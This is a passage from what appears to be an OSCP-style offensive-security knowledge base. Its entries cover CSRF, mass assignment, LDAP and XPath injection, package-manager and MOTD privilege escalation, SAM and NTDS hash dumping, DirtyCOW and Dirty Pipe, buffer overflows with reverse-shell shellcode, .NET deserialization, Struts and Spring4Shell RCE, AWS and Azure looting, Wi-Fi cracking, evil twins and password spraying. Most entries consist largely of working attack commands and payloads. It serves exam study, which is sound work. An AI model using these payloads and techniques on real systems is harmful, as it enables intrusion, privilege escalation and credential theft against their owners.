For GET actions, an `` suffices. JSON/CSRF-token endpoints need a bypass (below). ## Bypasses to test - **Token not tied to the session** (use your own token with the victim), or **not validated** when omitted/empty, or **only checked on POST** (switch to GET — see http-verb-tampering). - **SameSite gaps**: top-level GET navigations still send `SameSite=Lax` cookies; `None` sends on all. - **Change `Content-Type`** to `text/plain`/form to dodge a JSON-only check or preflight. - **Referer check** only — try removing the Referer (meta referrer) or a matching-prefix trick. ## Pattern "State-changing action + cookie-only auth + no/weak CSRF token -> auto-submitting cross-site form." Chain with self-XSS or login-CSRF for bigger impact. (See: cookies-sessions-jwt, cors-misconfig, http-verb-tampering.)

entries.title: Mass assignment / autobinding
entries.brief: Setting fields the UI never exposes by adding them to the request body
entries.body:
## The flaw
Frameworks that **auto-bind** request parameters straight onto an object/model (Rails
`params`, Spring, Django, Laravel, Node ORMs) will set **any** attribute whose name you supply —
including ones the form never shows. Add `isAdmin`, `role`, `balance`, `verified`, or `user_id` to
the body and, if the model trusts it, you escalate or tamper.

## How to find it
1. Submit a normal request (e.g. profile update) and note the fields.
2. Find the **real** attribute names: GET the object back (its JSON often lists them), read the
   API docs / JS, or guess (`role`, `is_admin`, `admin`, `group`, `permissions`, `status`,
   `email_verified`, `account_id`).
3. **Add** those fields to your request body and resend.

## Examples
    # normal:
    PUT /api/users/me   {"name":"bob","email":"bob@x.com"}
    # mass-assignment attempt:
    PUT /api/users/me   {"name":"bob","email":"bob@x.com","role":"admin","isVerified":true}
    # registration that sets your own role:
    POST /register      {"user":"bob","pass":"..","admin":true}
JSON and form bodies both work; try nested keys too (`user[role]=admin`).

## Related
The inverse of IDOR: IDOR reads/writes **another** object; mass assignment writes **extra fields**
on an object you're allowed to touch. Often found together. (See: idor-access-control, api-and-graphql.)

## Pattern
"Auto-binding framework -> discover hidden attribute names -> add them to the body (role/isAdmin/
balance) -> privilege or data tamper." Especially common on REST/JSON APIs. (See: attack-spa-react,
web-auth-bypass.)

entries.title: LDAP injection
entries.brief: Manipulating an LDAP query through unsanitised input to bypass auth or dump the directory
entries.body:
## Where it happens
Apps that authenticate or search against a directory build **LDAP filters** from user input:
`(&(uid=<user>)(userPassword=<pass>))`. If input isn't escaped, you alter the **filter logic** —
classic on corporate login pages and "search the address book" features.

## Auth bypass
The LDAP wildcard is `*`, and `)` closes a filter. Inject to make the filter always match:
    user:  *)(uid=*))(|(uid=*     pass: anything
    user:  admin)(&))             pass: anything        # comment-out the password clause
    user:  *                      # a bare wildcard sometimes matches the first entry
The goal is to turn `(&(uid=INPUT)(userPassword=INPUT))` into something that returns a user
regardless of the password.

## Blind extraction (data exfil)
Where there's no auth bypass but a true/false signal, extract attribute values char-by-char with
wildcards:
    (&(uid=admin)(userPassword=a*))     # "login ok / user found" => password starts with 'a'
    ... (userPassword=ab*) ...          # binary-search each char (like blind SQLi)
Enumerate attributes/users the same way: `(|(uid=a*)(uid=b*)...)`.

## Detect & special chars
Break the filter to see errors/behaviour changes: inject `*`, `(`, `)`, `\`, `|`, `&`, `NULL`.
A malformed-filter error or a changed result count confirms it.

## Pattern
"Input reaches an LDAP filter -> inject `*` and `)(|(...)` to bypass auth, or binary-search values
blindly." Same mindset as SQLi, different syntax. (See: blind-sqli, web-auth-bypass, ldap-enum.)

entries.title: sudo apt / dpkg / pip privesc
entries.brief: Package-manager features that run code as root when you can sudo them
entries.body:
## The idea
Package managers run with root and have **hooks and escape hatches** that execute commands. If
`sudo -l` lets you run one, that's a root shell — no vulnerability needed, just the feature.

## apt / apt-get
    sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"     # hook runs as root
    sudo apt-get install -o APT::Update::Pre-Invoke::="/bin/sh" x
    # GTFOBins also: sudo apt-get changelog apt   then  !/bin/sh   (pager escape)

## dpkg
    # build a tiny .deb whose postinst script is your payload, then:
    sudo dpkg -i evil.deb                 # postinst runs as root
    # or GTFOBins pager escape:  sudo dpkg -l   then  !/bin/sh

## pip / python packaging
    # malicious setup.py runs on install:
    echo 'import os; os.system("/bin/bash")' > setup.py
    sudo pip install . --no-index          # setup.py executes as root
    # (sudo pip download/install of an attacker package = code exec)

## gem / npm (same pattern)
`sudo gem open -e`, a malicious gem/npm `postinstall` script — any "install/build" step you can run
as root is code exec.

## Workflow
`sudo -l` -> is it a package manager (apt/apt-get/dpkg/pip/gem/npm/yum/snap)? -> `oscp gtfo <it>`
for the exact escape, or use its install-hook.

## Pattern
"sudo a package manager -> abuse an install hook / build script (Pre-Invoke, postinst, setup.py) ->
root." Always check GTFOBins for the binary. (See: sudo-gtfobins-privesc, sudoers-file.)

entries.title: Backup Operators / SeBackupPrivilege
entries.brief: Using backup rights to read any file and dump the hashes
entries.body:
## Why the right is dangerous
**SeBackupPrivilege** (held by the **Backup Operators** group) lets a process **read any file**,
ignoring ACLs, "for backup purposes." That includes the **SAM/SYSTEM** registry hives and, on a DC,
the **NTDS.dit** database — i.e. every hash. You don't need to be an admin; Backup Operators is enough.

## Confirm
    whoami /priv            # SeBackupPrivilege / SeRestorePrivilege = Enabled
    whoami /groups          # BUILTIN\Backup Operators

## On a workstation/server — dump SAM
    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive
    # exfil, then parse offline:
    impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # local hashes -> PtH

## On a Domain Controller — dump NTDS (the whole domain)
Use a backup-aware copy (the file is locked). The common path is a **diskshadow** script to snapshot
the volume, then a SeBackup-aware copy (robocopy /b or a tool like `NinjaCopy`):
    # diskshadow script creates a shadow copy of C:, exposed as e.g. Z:
    #   -> copy Z:\Windows\NTDS\ntds.dit  and  reg save HKLM\SYSTEM
    impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL    # every domain hash (krbtgt!)
`impacket-smbserver` or `evil-winrm` upload/download moves the files. With krbtgt -> golden ticket.

## Pattern
"SeBackupPrivilege / Backup Operators -> read SAM+SYSTEM (or snapshot + copy NTDS on a DC) ->
secretsdump -> PtH / golden ticket." A member-of-group win, not an exploit. (See: lsass-dumping,
dcsync-dcshadow, golden-silver-tickets.)

entries.title: DirtyCOW & Dirty Pipe kernel LPEs
entries.brief: Two famous Linux kernel bugs that overwrite root-owned files from an unprivileged user
entries.body:
## When kernel exploits are the answer
After sudo/SUID/cron/caps/groups are exhausted and the kernel is old, a kernel LPE may be the way.
Two of the most reliable (and exam-relevant) are DirtyCOW and Dirty Pipe. Both let an unprivileged
user **write to files they should only be able to read**, which you turn into root.

## DirtyCOW — CVE-2016-5195 (kernels ~2.6.22 to pre-2016 patch)
A race in copy-on-write memory lets you write to read-only file mappings. Common payloads:
- **Overwrite /etc/passwd** (add a UID-0 user) — the `dirtyc0w`/`dirty.c` variants.
- **Hijack a SUID binary** (`pokemon`/`c0w` variant replaces it with your code).
    gcc -pthread dirty.c -o dirty -lcrypt ; ./dirty <newpass>   # patches /etc/passwd -> su firefart
Caveat: can be unstable / crash the box — prefer the /etc/passwd variant and know the risk.

## Dirty Pipe — CVE-2022-0847 (kernels 5.8 to 5.16.x pre-patch)
A pipe-buffer flaw lets you **overwrite data in any read-only file** (page cache). Cleaner than
DirtyCOW. Typical uses:
- Overwrite `/etc/passwd`'s root entry (null the password) then `su root`.
- Inject into a **SUID** binary to spawn a root shell (the "exploit-1"/"exploit-2" PoCs).
    gcc exploit.c -o dp ; ./dp /usr/bin/su        # patches a SUID binary -> root shell

## Match kernel -> exploit
    uname -r        # kernel version -> is it in range?
    searchsploit dirtycow ; searchsploit dirty pipe
Only after confirming the version and understanding the stability risk.

## Pattern
"Old kernel + nothing simpler worked -> uname -r -> DirtyCOW (2016) or Dirty Pipe (2022) -> overwrite
/etc/passwd or a SUID binary -> root." Last resort; can crash the target. (See: kernel-exploits,
writable-passwd-shadow-privesc, linux-enum-checklist.)

entries.title: Writable MOTD / update-motd.d
entries.brief: How a writable message-of-the-day script runs your code as root on login
entries.body:
## The mechanism
On Debian/Ubuntu, the dynamic **message of the day** is generated by scripts in
**`/etc/update-motd.d/`**, run by **`pam_motd`** as **root** whenever a user logs in (SSH/console).
If any of those scripts — or the directory — is **writable** by you, append a payload; it executes as
root at the next login (yours or anyone's).

## Spot it
    ls -la /etc/update-motd.d/        # a script you can write? or a writable dir?
    # also check: /etc/motd writable, or a writable file a motd script sources

## Exploit
    echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/update-motd.d/00-header
    # trigger by logging in again (new SSH session):
    ssh user@localhost        # pam_motd runs the script as root
    /tmp/rootbash -p          # SUID root shell
If you can't SSH in, any new login (including other users) triggers it.

## Historical note
CVE-2010-0832 and related pam_motd issues made this a classic; the writable-script case still appears
on misconfigured boxes today. LinPEAS flags writable files under /etc/update-motd.d.

## Pattern
"Writable /etc/update-motd.d script -> append a SUID-root payload -> trigger with a fresh login ->
root." A quiet, reliable win when the misconfig exists. (See: writable-cron-walkthrough,
writable-passwd-shadow-privesc, linux-enum-checklist.)

entries.title: Windows 32-bit stack overflow — the OSCP workflow
entries.brief: The six repeatable steps from a crash to a SYSTEM shell on a classic stack BOF
entries.body:
## The six steps (memorise the order, not the addresses)
A vulnerable 32-bit app with no DEP/ASLR on the module. You overwrite the saved return address
(EIP), point it at a JMP ESP, and land in your shellcode. Debug with Immunity + mona.py.

## 1. Fuzz — find that it crashes
Send growing input until the service dies and EIP looks overwritten.
    # spike / boofuzz, or a simple python loop sending "A"*n in steps of 100-200
    oscp atlas spike

## 2. Find the EIP offset
Send a cyclic pattern, read the value in EIP at the crash, compute the offset.
    msf-pattern_create -l 3000          # send this
    msf-pattern_offset -l 3000 -q <EIP> # -> the exact offset   (oscp atlas pattern_create)
    # verify: send "A"*offset + "BBBB" + "C"*n  -> EIP == 42424242

## 3. Find bad characters
Send all bytes \x01..\xff after EIP, compare memory to a clean list; drop any that mangle.
    !mona bytearray -b "\x00"           # generate the test array + a compare file
    !mona compare -f bytearray.bin -a <ESP>    # lists bad chars to exclude
`\x00` is almost always bad; keep removing until the buffer is intact.

## 4. Find a JMP ESP (the return address)
Find a `JMP ESP` (FFE4) in a module **without ASLR**, avoiding bad chars.
    !mona jmp -r esp -cpb "\x00\x0a"    # -> an address like 0x625011AF (use it little-endian)

## 5. Generate shellcode
    msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 \
      -f c -b "\x00\x0a..." EXITFUNC=thread          # exclude the bad chars
    oscp hacktools msfvenom           # (the generator)

## 6. Build & fire the exploit
    buffer = "A"*offset + pack("<I", 0x625011AF) + "\x90"*16 + shellcode
Start a listener (`oscp hacktools listener 443`), send it, catch the shell.

## Pattern
"fuzz -> EIP offset -> bad chars -> JMP ESP (no-ASLR module) -> shellcode (minus bad chars) -> NOP
sled + payload." The exam BOF is this exact loop. (See: buffer-overflow-basics, seh-overflow,
bof-64-and-rop.)

entries.title: SEH-based overflow — overwrite the exception handler
entries.brief: When EIP isn't directly controlled: overwrite nSEH/SEH, POP POP RET, short jump to shellcode
entries.body:
## When to use it
A long buffer crashes the app but EIP shows data handled by the SEH chain (not your `42424242`).
`!mona findmsp` reports 'SEH record' overwritten. You control **nSEH** (4 bytes) then **SEH** (4).

## 1. Offsets to nSEH/SEH
    msf-pattern_create -l 1000    # send
    !mona findmsp                 # gives offset to nSEH and SEH

## 2. POP POP RET gadget (goes in SEH)
The handler executes via POP POP RET, landing you back on nSEH.
    !mona seh -cpb '\x00\x0a'     # lists POP POP RET addresses (SafeSEH-free module)

## 3. nSEH = short jump over SEH to shellcode
    nSEH = short jump forward, e.g. \xeb\x06\x90\x90   (EB 06 = jmp +6)
    SEH  = POP POP RET address (little-endian)
Layout: `A*offset + nSEH(jmp) + SEH(ppr) + nops + shellcode`.

## 4. If space is tight -> egghunter
    !mona egg -t w00t              # 32-byte hunter; stage shellcode elsewhere tagged w00tw00t
Put the small egghunter after SEH; it scans memory for your tagged full shellcode.

## Gotchas
- Pick the POP POP RET from a module WITHOUT SafeSEH and without bad chars in the address.
- `jmp short` is only +127 bytes; use an egghunter if shellcode doesn't fit right after.
- Same bad-char discipline as **buffer-overflow-windows** step 3.

entries.title: ret2libc — defeating NX
entries.brief: Returning into libc functions to get a shell when the stack is non-executable
entries.body:
## The problem NX creates
With **NX/DEP**, you can overwrite the return address but **can't execute shellcode on the stack**.
**ret2libc** sidesteps it: instead of jumping to your code, you jump to code that already exists and
is executable — libc functions like **system()** — and arrange the stack so it runs `system("/bin/sh")`.

## 32-bit ret2libc (the classic)
After the offset, the saved EIP is replaced with a chain laid out as the function expects:
    [ &system ][ &exit ][ &"/bin/sh" ]
- `&system` — call system(); on return it goes to `&exit` (clean exit); its argument is `&"/bin/sh"`.
- Find addresses:  `p system`, `p exit` in gdb; the `/bin/sh` string via `find` or an env var.
    # no ASLR:  offset + p32(system) + p32(exit) + p32(binsh)

## 64-bit — args go in registers (use a ROP gadget)
System V passes the 1st argument in **RDI**, so you need a `pop rdi; ret` gadget to set it:
    offset + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
(`ret` keeps the stack 16-byte aligned for `system`.) Find gadgets with ROPgadget/ropper; `one_gadget`
may give a single-jump shell.

## Beating ASLR
If libc is ASLR'd, first **leak** a libc address (e.g. puts@GOT via a puts call — ret2plt), compute
the libc base, then do ret2libc with the real addresses. `pwntools` + a libc-database identify the
version.

## Pattern
"NX on -> ret into system() with '/bin/sh' as the arg (stack layout on x86; pop rdi gadget on x64)
-> leak libc first if ASLR." The gateway from stack shellcode to ROP. (See: bof-64-and-rop,
binary-exploit-mitigations, buffer-overflow-basics.)

entries.title: AWS enumeration with stolen keys
entries.brief: Turning leaked AWS credentials into recon and a foothold in the account
entries.body:
## You have keys — now what
Keys come from SSRF->metadata (cloud-metadata-ssrf), leaked configs, git history, or `~/.aws`.
Configure and confirm who you are, then enumerate what they can touch.

## 1. Whoami
    aws configure            # or export AWS_ACCESS_KEY_ID / SECRET / SESSION_TOKEN
    aws sts get-caller-identity          # account id, user/role ARN  (oscp atlas aws)
Temporary creds (from metadata) include a **session token** — set all three.

## 2. Enumerate permissions & services
    aws iam list-attached-user-policies --user-name <u> ; aws iam list-user-policies ...
    aws s3 ls                                   # buckets you can list
    aws s3 ls s3://<bucket> --recursive ; aws s3 cp s3://<bucket>/secret .
    aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress]'
    aws secretsmanager list-secrets ; aws secretsmanager get-secret-value --secret-id <id>
    aws ssm describe-parameters ; aws ssm get-parameter --name <n> --with-decryption
Secrets Manager / SSM Parameter Store are credential goldmines.

## 3. Privilege escalation & lateral
    # run commands on EC2 if you have ssm:
    aws ssm send-command --instance-ids <id> --document-name AWS-RunShellScript \
      --parameters 'commands=["id"]'
IAM misconfigs (iam:PassRole + create function/instance, policy version rollback, etc.) escalate —
**Pacu** automates finding these (`oscp atlas pacu`); **ScoutSuite** audits the whole account.

## Pattern
"get-caller-identity -> enumerate IAM perms + S3/EC2/Secrets/SSM -> loot secrets -> SSM run-command /
IAM privesc (Pacu)." (See: cloud-metadata-ssrf, cloud-basics.)

entries.title: Azure / Entra ID basics & attacks
entries.brief: The parts of Microsoft's cloud identity and the common attacker paths
entries.body:
## The landscape (different from on-prem AD)
**Entra ID** (formerly Azure AD) is the cloud identity plane; **Azure** (ARM) is the resource plane.
Auth is **OAuth2 tokens**, not Kerberos. Key ideas: **users/service principals/managed identities**,
**roles** (Entra roles like Global Admin; Azure RBAC like Owner/Contributor), and **Conditional Access**.
Hybrid setups sync on-prem AD via **Entra Connect** (a juicy pivot both ways).

## Recon (with creds/tokens)
    az login            # or az login --service-principal -u <appid> -p <secret> --tenant <t>
    az account show ; az ad signed-in-user show
    az ad user list ; az ad group list ; az role assignment list --all
    az resource list ; az vm list ; az keyvault list      # (oscp atlas az)
    # unauth/token recon: roadrecon gathers the whole directory  (oscp atlas roadrecon)

## Common attack paths
- **Password spraying** Entra (MFA gaps, legacy auth) -> a first token.
- **Device code phishing**: start a device-code flow, send the code to a victim -> their token.
- **Managed identity on a VM/function**: hit the IMDS endpoint for an Entra token, then use it
  against ARM/KeyVault (the cloud-metadata idea, Azure flavour).
- **Key Vault**: `az keyvault secret list/show` — secrets/keys/certs.
- **Illicit consent / app registration** abuse for persistence.
- **Hybrid**: Entra Connect sync account / PHS -> on-prem DA, or on-prem -> cloud.

## Pattern
"Get a token (spray / device-code / managed identity) -> az + roadrecon to map users/roles/resources
-> loot Key Vault + abuse RBAC/role assignments -> pivot across the hybrid boundary." (See:
cloud-basics, cloud-metadata-ssrf, password-spraying.)

entries.title: PMKID & WPS attacks
entries.brief: Two ways to get a WPA2 key without waiting for a client handshake
entries.body:
## PMKID — clientless WPA/WPA2 cracking
Many APs leak a **PMKID** in the first EAPOL frame, so you can grab crackable material **without any connected client**
(no deauth needed).
    sudo airmon-ng start wlan0
    sudo hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1     # capture PMKIDs
    hcxpcapngtool -o hash.hc22000 dump.pcapng                         # convert
    hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt    # crack the PSK
(`oscp atlas hcxdumptool`.) Only works if the AP includes the PMKID; otherwise fall back to the
4-way handshake (wireless-wpa-handshake).

## WPS — Pixie Dust & PIN brute
**WPS** (the 8-digit setup PIN) is a separate weakness. If enabled and vulnerable:
    wash -i wlan0mon                               # list WPS-enabled APs
    reaver -i wlan0mon -b <BSSID> -K 1             # Pixie Dust (offline, fast, if vulnerable)
    reaver -i wlan0mon -b <BSSID> -vv              # online PIN brute (slow; lockouts)
Pixie Dust recovers the PIN offline in seconds on weak chipsets; the PIN then yields the PSK.
(`oscp atlas reaver` · `wifite` automates both.)

## Pattern
"PMKID (hcxdumptool -> -m 22000) needs no client; WPS (wash -> reaver -K pixie) bypasses the PSK via
the setup PIN." Try these before deauth-capturing a handshake. (See: wireless-wpa-handshake,
wireless-overview, wireless-lab-setup-macos.)

entries.title: Evil twin & rogue AP
entries.brief: Capturing credentials by impersonating a trusted wireless network
entries.body:
## The idea
Stand up a **rogue access point** with the **same SSID** as a target network. Clients (or users)
connect to you, and you either capture a **captive-portal credential** or, for enterprise Wi-Fi,
the **EAP/MSCHAPv2 challenge** to crack. Pure social/logic attack on the trust of a network name.

## Open / PSK networks — captive portal
Tools like **airgeddon**/**wifite** automate: clone the SSID, deauth clients off the real AP so they
reconnect to yours, and serve a fake "router firmware update / login" page that harvests the Wi-Fi
password or other creds. You verify a captured PSK against the real handshake.

## Enterprise (WPA2-EAP / PEAP) — steal the EAP hash
With **eaphammer** or **hostapd-mana**, impersonate the RADIUS/EAP endpoint; connecting clients
send a **MSCHAPv2** challenge/response you capture and crack offline:
    eaphammer --cert-wizard                         # make a cert once
    eaphammer -i wlan0 --essid CorpWiFi --creds     # rogue AP, harvest EAP creds
    hashcat -m 5500 captured.txt rockyou.txt        # NetNTLMv1-style MSCHAPv2
(`oscp atlas eaphammer`.) This yields **domain** credentials on corporate networks.

## Note & defence
Needs an adapter that supports AP mode + the right drivers (wireless-lab-setup-macos). Mitigations:
server-cert validation on clients, 802.1X with proper CA pinning, PMF. Authorised engagements only.

## Pattern
"Clone the SSID -> deauth clients to you -> captive portal (PSK nets) or eaphammer MSCHAPv2 capture
(enterprise) -> crack." Trust-in-a-name is the whole vulnerability. (See: wifi-pmkid-wps,
wireless-overview, llmnr-nbtns-poisoning.)

entries.title: .NET deserialization & ViewState
entries.brief: How insecure .NET serializers and a leaked ViewState key lead to RCE
entries.body:
## The bug family
Like Java/PHP, .NET deserialization of attacker data is RCE when a dangerous **formatter** is used
(`BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `SoapFormatter`, `Json.NET` with
`TypeNameHandling`). The payloads come from **ysoserial.net** (distinct from the Java `ysoserial`).

## Where it hides
- **ASP.NET ViewState** (`__VIEWSTATE`) — the big one. If MAC validation is off, or you have the
  machine key (**validationKey/decryptionKey** from a leaked `web.config`), you forge a ViewState
  that deserializes to a command.
- Serialized blobs in cookies, hidden fields, caches, WCF/remoting endpoints, or any API taking
  `application/octet-stream`.

## Exploit — ViewState with a known key
    ysoserial.exe -p ViewState -g TextFormattingRunProperties \
      -c "powershell -enc <b64>" \
      --generator=<__VIEWSTATEGENERATOR> \
      --validationkey=<KEY> --validationalg=SHA1
Post the result as `__VIEWSTATE`. Without a key, you need MAC-disabled ViewState or another gadget.
Find machine keys in leaked `web.config`, LFI, or source.

## Exploit — generic formatter sink
    ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "cmd /c whoami" -o base64
Send where the app deserializes it.

## Pattern
"Find a .NET serialized sink (ViewState / cookie / API) -> ysoserial.net builds a gadget payload
(with the machine key for ViewState) -> RCE as the app pool." (See: java-deserialization,
php-deserialization-phar, web-source-review.)

entries.title: Elasticsearch / CouchDB / Memcached enum
entries.brief: Looting the schemaless data stores that often sit open with no auth
entries.body:
## Why these matter
Search engines, document stores and caches frequently ship **with no authentication** and get
exposed. They hold application data, tokens and sometimes creds. Fingerprint by port and a quick HTTP
probe.

## Elasticsearch (9200/9300)
    curl -s http://$TARGET:9200/                       # version banner
    curl -s http://$TARGET:9200/_cat/indices?v         # list indices (the "tables")
    curl -s http://$TARGET:9200/<index>/_search?pretty&size=100   # dump documents
    curl -s "http://$TARGET:9200/_search?q=password&pretty"       # grep for secrets
Kibana (5601) is its UI — check it too. Old versions have RCE CVEs (e.g. CVE-2015-1427 Groovy).

## CouchDB (5984)
    curl -s http://$TARGET:5984/                       # version
    curl -s http://$TARGET:5984/_all_dbs               # list databases
    curl -s http://$TARGET:5984/<db>/_all_docs?include_docs=true
    # CVE-2017-12635 (priv-esc to admin via duplicate JSON keys) + 12636 -> RCE on old builds

## Memcached (11211)
    nc $TARGET 11211      # then:  stats   ·   stats items   ·   stats cachedump <slab> 0   ·   get <key>
    memcached-tool $TARGET:11211 dump
Caches hold session tokens and query results — grab keys and read values.

## Cassandra (9042) / others
    cqlsh $TARGET 9042     # try default cassandra/cassandra; DESCRIBE KEYSPACES; SELECT * FROM ...
Also watch for **RethinkDB (28015)**, **Riak**, **etcd (2379)** — same "open + dump" approach.

## Pattern
"Fingerprint the port -> list indices/dbs/keys -> dump + grep for passwords/tokens -> check the
version for an RCE CVE -> reuse any creds found." (See: database-enum, redis-exploitation,
kubernetes-attacks.)

entries.title: The Kerberos double-hop problem
entries.brief: Why your WinRM commands can't reach a second host, and how to get around it
entries.body:
## The symptom
You evil-winrm / PSRemote into HOST-A with a password, everything works — but the moment you try to
reach **HOST-B** from that session (a share, a DB, another remote command) you get **Access Denied**,
even though your account is allowed. That's the **double hop**.

## Why it happens
When you authenticate to HOST-A over WinRM with a password, HOST-A gets a Kerberos **service ticket**
for itself — **not your TGT**. By default it **cannot forward your credentials** on to HOST-B
("unconstrained delegation" isn't in play), so the second hop has **no credentials** and fails.

## Workarounds (pick what the box allows)
- **Use creds explicitly on the 2nd hop** — don't rely on the session's identity:
      $c = New-Object System.Management.Automation.PSCredential('CORP\user',(ConvertTo-SecureString 'Pass' -AsPlainText -Force))
      Invoke-Command -ComputerName HOST-B -Credential $c -ScriptBlock { whoami }
      # or run tools with -u/-p (nxc, impacket) that re-supply the credential each time.
- **Get a TGT on HOST-A** (so you *have* forwardable creds there): use **Rubeus** `asktgt`/`tgtdeleg`
  and inject it (`/ptt`), then the second hop uses Kerberos with your ticket.
- **Enable CredSSP** (if you can): `-Authentication CredSSP` forwards the password (noisy, needs config).
- **Register a PSSession with explicit creds** and hop from there.
- **Pivot differently**: RDP in (interactive logon *does* get a TGT), or get a full shell and run
  local tools with supplied creds.

## Pattern
"WinRM/password logon -> no forwardable TGT on HOST-A -> 2nd hop fails. Fix: supply creds explicitly
each hop, or get+inject a TGT (Rubeus), or use CredSSP/RDP." (See: pass-the-hash-ticket,
attack-rdp-winrm, kerberos-delegation.)

entries.title: XPath / XQuery injection
entries.brief: Bypassing auth and extracting XML data when input builds an XPath query
entries.body:
## Where it happens
Apps that store users/data in **XML** and query it with **XPath** (`//user[name='X' and pass='Y']`)
are injectable just like SQL when input isn't sanitised — common on legacy login forms and
XML-backed search.

## Auth bypass
XPath has no comments, so you make the predicate always true and close the quotes:
    name:  ' or '1'='1       pass:  ' or '1'='1
    name:  admin' or '1'='1' or 'a'='a
    name:  ' or 1=1 or ''='     # turns the filter into "match everything"
The goal: `//user[name='' or '1'='1' and pass='...']` returns a user regardless of password.

## Blind extraction (no comments, so use functions)
With a true/false oracle, pull data char-by-char using XPath string functions:
    ' and substring(//user[1]/password,1,1)='a' and ''='      # true if 1st char is 'a'
    ' and string-length(//user[1]/password)=8 and ''='        # length
    count(//user)                                             # how many records
Enumerate node names with `name(//*[position()=1])` to map the document blindly.

## XQuery / detection
Break the query to confirm: inject `'`, `"`, `]`, `)` and watch for XPath errors or changed results.
XQuery (used by some XML DBs) extends this and can sometimes reach files/functions.

## Pattern
"Input builds an XPath query -> `' or '1'='1` to bypass auth, or substring()/string-length() to
binary-search values blindly." Same mindset as SQLi/LDAP injection, XML flavour. (See: ldap-injection,
blind-sqli, xxe-logic.)

entries.title: Java web RCE — Spring4Shell, Struts, OGNL
entries.brief: The recurring expression-language and binding flaws that give RCE in Java apps
entries.body:
## The theme
Java web frameworks repeatedly expose **server-side expression evaluation** or **unsafe property binding**
that turns a crafted parameter into code execution. Fingerprint the framework (headers,
error pages, `/`), match the CVE, confirm with a safe probe, then weaponise.

## Spring (Spring4Shell — CVE-2022-22965)
Spring MVC/WebFlux on JDK 9+ with data binding: crafted `class.module.classLoader.*` parameters let
you write a JSP webshell via the Tomcat access log valve.
    # PoC sets logging properties to drop a .jsp, then browse it:
    POST / with params: class.module.classLoader.resources.context.parent.pipeline.first.pattern=<jsp> ...
Match the exact PoC to the version; public exploits automate it.

## Apache Struts 2 (OGNL — e.g. S2-045/CVE-2017-5638, and others)
OGNL expression injection, often via the **Content-Type** header or a parameter:
    Content-Type: %{(#_='multipart/form-data')...(#cmd='id')...}      # the classic S2-045 string
Struts has a long CVE history; `searchsploit struts` + the S2-xxx number.

## General Java EL / template injection
- **OGNL/MVEL/SpEL** injection in search or error parameters -> `${7*7}`/`%{7*7}` probes
  (see ssti-logic for the methodology).
- **Deserialization** sinks (see java-deserialization) — different bug, same Java targets.

## Confirm safely first
Use an OOB callback (`oscp atlas interactsh-client`) or a time delay before firing a real payload,
so you prove execution without a blind shot.

## Pattern
"Fingerprint the Java framework -> match CVE (Spring4Shell binding / Struts OGNL / SpEL) -> probe
with an expression or OOB callback -> drop a JSP or run a command." (See: ssti-logic,
java-deserialization, log4shell-jndi.)

entries.title: Reading the AD password policy (spray safely)
entries.brief: Checking lockout thresholds before spraying so you don't lock out the domain
entries.body:
## Why check first
Password spraying is powerful but **lockouts** get you caught and can disrupt the environment (an
exam/engagement no-no). Before spraying, read the **account lockout policy**: threshold, observation
window, and duration. Spray **below** the threshold, and pace by the window.

## Read the policy
    nxc smb <DC> -u user -p pass --pass-pol              # lockout threshold + window, min length
    # or:
    rpcclient -U 'user%pass' <DC> -c "getdompwinfo"
    net accounts /domain                                 # from a Windows host
    # fine-grained (PSOs) may override for some groups:
    Get-ADFineGrainedPasswordPolicy -Filter *            # if RSAT available
Also pull **badPwdCount** per user where possible, and note the **lockoutObservationWindow** (often
30 min) — attempts age out after it.

## Spray within limits
    # threshold 5, window 30min -> try at most 3-4 passwords, then wait > 30 min
    nxc smb <DC> -u users.txt -p 'Season2024!' --continue-on-success
    kerbrute passwordspray -d corp.local --dc <DC> users.txt 'Welcome1'
One carefully chosen password (season+year, Company123!, Welcome1) across all users beats many
passwords against one user.

## Pattern
"Read --pass-pol (threshold/window) -> spray fewer attempts than the threshold, paced by the window ->
one good password across all users." Enumerate users first (ad-enum-without-creds). (See:
password-spraying, asreproasting, kerberos-time-skew.)

entries.title: Hijacking tmux / screen sessions
entries.brief: Attaching to another user's (often root's) multiplexer session
entries.body:
## The idea
`tmux` and `screen` keep sessions alive through a **socket file**. If a privileged user (often root)
left a session running and its socket is **accessible to you** (loose permissions, a shared socket
dir, or you're in the right group), you can **attach to it and inherit that user's shell** — instant
privesc, no exploit.

## Find a session you can attach to
    # tmux sockets:
    ls -la /tmp/tmux-*  /tmp/tmux-0            # root's socket dir is /tmp/tmux-0
    ps aux | grep -E 'tmux|screen'            # is root running one?
    # screen sockets:
    ls -la /var/run/screen/  /tmp/screens/
If you can read/write root's tmux socket (e.g. it's 0777, or a SUID screen exists), you're in.

## Attach
    tmux -S /tmp/tmux-0/default attach         # attach to root's tmux via its socket
    screen -x root/                            # join root's screen session (if permitted)
    # a SUID screen is itself a GTFOBins privesc:
    oscp gtfo screen
You land directly in that user's live shell.

## Why it happens
Admins run long jobs in tmux/screen and leave them; a setup script `chmod`s the socket too broadly,
or `screen` is SUID. LinPEAS flags accessible multiplexer sockets and SUID screen/tmux.

## Pattern
"Find a root tmux/screen socket you can access (or a SUID screen) -> attach -> inherit root's shell."
Cheap win when present. (See: suid-concept, sudo-gtfobins-privesc, linux-enum-checklist.)

entries.title: Email spoofing — SPF / DKIM / DMARC
entries.brief: Judging whether you can spoof a domain's email for a phishing engagement
entries.body:
## Why it matters
For an authorised phishing engagement, whether you can convincingly spoof `@target.com` depends on
its **SPF**, **DKIM** and **DMARC** DNS records. Weak or missing records mean mail from a forged
sender lands in the inbox.

## Read the records
    dig +short TXT target.com            | grep spf     # SPF: who may send
    dig +short TXT _dmarc.target.com                    # DMARC: policy on failures
    dig +short TXT selector._domainkey.target.com       # DKIM (need the selector)
`spoofcheck`/`dnstwist` and MX toolbox automate this.

## How to read them
- **SPF** `v=spf1 ... -all` (hard fail) is strict; `~all` (soft fail) or **no SPF** is spoofable.
